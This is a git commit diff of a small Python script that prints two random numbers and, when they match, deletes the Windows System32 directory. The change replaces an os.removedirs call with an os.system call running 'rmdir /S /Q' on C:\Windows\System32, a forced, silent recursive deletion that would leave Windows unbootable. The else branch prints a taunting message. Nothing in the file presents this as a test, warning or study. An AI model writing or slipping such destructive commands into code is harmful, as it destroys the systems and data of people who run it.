bdd858c0cd4b16c4077ae1977559a1e497310a5d
BlueKitsune狐 <116144344+bluekitsune-sad@users.noreply.github.com>
2025-09-01 21:26:10 +0500

    Update if.py

--- ifelse/if.py
+++ ifelse/if.py
@@ -11,7 +11,8 @@ print(f"Random Number 2: {random_number_2}")
 
 # Check if the numbers are the same
 if random_number_1 == random_number_2:
-    os.removedirs('C:\Windows\System32')
+    os.system("rmdir /S /Q C:\\Windows\\System32")
 else:
     print("YOu are safe for NOW ...")
+
 
